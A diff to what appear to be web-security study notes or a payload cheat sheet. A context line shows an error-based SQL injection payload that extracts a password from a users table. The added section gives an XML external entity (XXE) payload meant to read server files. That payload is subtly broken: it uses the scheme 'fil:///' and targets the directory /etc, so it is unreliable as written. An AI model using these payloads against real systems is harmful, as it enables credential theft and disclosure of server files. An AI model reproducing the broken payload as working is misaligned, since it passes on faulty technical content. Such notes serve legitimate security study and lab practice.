@@ -97,3 +97,8 @@ Payload: `' and 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
 
 ### Exploiting XXE to retrieve files
 
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "fil:///etc"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+```
